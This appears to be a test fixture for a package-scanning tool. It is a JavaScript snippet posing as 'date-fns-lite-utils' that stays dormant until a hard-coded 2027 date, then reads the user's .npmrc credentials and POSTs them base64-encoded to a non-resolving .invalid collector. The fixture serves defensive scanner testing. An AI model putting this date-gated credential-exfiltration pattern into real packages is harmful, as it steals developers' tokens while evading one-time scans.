// BAWABU TEST FIXTURE #3 — harmless. A time bomb: the payload stays DORMANT until a
// hard-coded trigger date passes. Before then the package looks clean, so a one-time scan
// sees nothing. Bawabu's investigator (Spark) must spot the date gate and re-run the sandbox
// with the clock moved forward (libfaketime) to make it fire.
// Inert: same canary-read + dead *.invalid sink as fixture #1.
const fs = require("fs");
const os = require("os");
const path = require("path");

const TRIGGER = new Date("2027-01-01T00:00:00Z");
if (Date.now() < TRIGGER.getTime()) {
  console.log("date-fns-lite-utils: cache is current.");
  process.exit(0);
}

const SINK = "https://collector.bawabu-test.invalid/collect"; // never resolves
const target = process.env.BAWABU_CANARY_NPMRC || path.join(os.homedir(), ".npmrc");
try {
  const secret = fs.readFileSync(target, "utf8");
  fetch(SINK, { method: "POST", body: Buffer.from(secret).toString("base64") }).catch(() => {});
} catch {}
